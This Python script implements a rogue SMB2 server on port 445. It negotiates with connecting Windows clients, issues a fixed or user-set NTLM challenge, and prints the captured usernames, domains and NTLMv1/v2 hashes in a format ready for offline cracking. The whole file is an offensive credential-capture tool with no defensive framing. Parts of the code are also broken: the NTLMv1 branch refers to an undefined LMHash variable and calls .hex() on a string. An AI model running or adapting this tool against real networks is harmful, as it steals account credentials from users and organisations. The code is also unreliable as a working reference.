from argparse import ArgumentParser
import struct
from socketserver import BaseRequestHandler, TCPServer
from collections import OrderedDict
import re
import sys
sys.path.append("./")
from  packet import *


def RandomChallenge():
    if args.challenge:
       return bytes.fromhex(args.challenge)
    else:
       return bytes.fromhex("1122334455667788")

def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
    SSPIStart  = data.find(b'NTLMSSP')
    SSPIString = data[SSPIStart:]
    LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
    LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
    #LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen].decode("utf-8")
    NthashLen    = struct.unpack('<H',data[SSPIStart+20:SSPIStart+22])[0]
    NthashOffset = struct.unpack('<H',data[SSPIStart+24:SSPIStart+26])[0]

    if NthashLen == 24:
        SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen].hex().upper()
        DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
        DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
        Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
        UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
        UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
        Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
        print(Username+"::"+ Domain+":"+ LMHash.hex()+":"+ SMBHash.hex()+":"+ Challenge.hex())

    if NthashLen > 60:
        SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen].hex().upper()
        DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
        DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
        Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
        UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
        UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
        Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
        print(Username+"::"+Domain+":"+Challenge.hex()+":"+SMBHash[:32]+":"+SMBHash[32:])


def GrabMessageID(data):
    Messageid = data[28:36]
    return Messageid
def GrabCreditCharged(data):
    CreditCharged = data[10:12]
    return CreditCharged
def GrabCreditRequested(data):
    CreditsRequested = data[18:20]
    if CreditsRequested == b"\x00\x00":
       CreditsRequested =  b"\x01\x00"
    else:
       CreditsRequested = data[18:20]
    return CreditsRequested
def GrabSessionID(data):
    SessionID = data[44:52]
    return SessionID


class smb2(BaseRequestHandler):
    def resHeadPlusBody(self, head, body):
        packet1 = head.return_bytes()+body.return_bytes()
        #>i means big-endian integer
        return struct.pack(">i", len(packet1))+packet1
    def handle(self):
        self.try_time = 0
        while True:
            data = self.request.recv(1024)
            self.request.settimeout(1)
            Challenge = RandomChallenge()
            if not data:
                return
            if data[8:10] == b'\x72\x00'and re.search("SMB 2.\?\?\?", str(data)):
                head = SMB2Header(CreditCharge=b"\x00\x00",
                                   Credits=b"\x01\x00")
                body = SMB2NegoAns()
                body.calculate()
                buffer_ = self.resHeadPlusBody(head, body)
                self.request.send(buffer_)
                data = self.request.recv(1024)
            if data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
                head = SMB2Header(MessageId=GrabMessageID(data), 
                        PID=b"\xff\xfe\x00\x00",
                        CreditCharge=GrabCreditCharged(data),
                        Credits=GrabCreditRequested(data))
                body = SMB2NegoAns(Dialect=b"\x10\x02")
                body.calculate()
                buffer_ = self.resHeadPlusBody(head, body)
                self.request.send(buffer_)
                data = self.request.recv(1024)
            if data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
                head = SMB2Header(Cmd=b"\x01\x00",
                        MessageId=GrabMessageID(data),
                        PID=b"\xff\xfe\x00\x00",
                        CreditCharge=GrabCreditCharged(data),
                        Credits=GrabCreditRequested(data),
                        SessionID=GrabSessionID(data),
                        NTStatus=b"\x16\x00\x00\xc0")
                body = SMB2Session1Data(NTLMSSPNtServerChallenge=Challenge)
                body.calculate()
                buffer_ = self.resHeadPlusBody(head, body)
                self.request.send(buffer_)
                data = self.request.recv(1024)
            if data[16:18] == b"\x01\x00" and GrabMessageID(data)[0:1] == b"\x02" and data[4:5] == b"\xfe":
                ParseSMBHash(data, self.client_address[0], Challenge)

if __name__ == "__main__":
    import sys
    parser = ArgumentParser()                                                                                                                              
    parser.add_argument("-c", "--challenge", help="input a 16 char challenge")
    args = parser.parse_args()
    if args.challenge and len(args.challenge)!=16:
        print("challenge must be 16 char")
        sys.exit()
    host = "0.0.0.0"
    port = 445
    server = TCPServer((host, port), smb2)
    server.serve_forever()
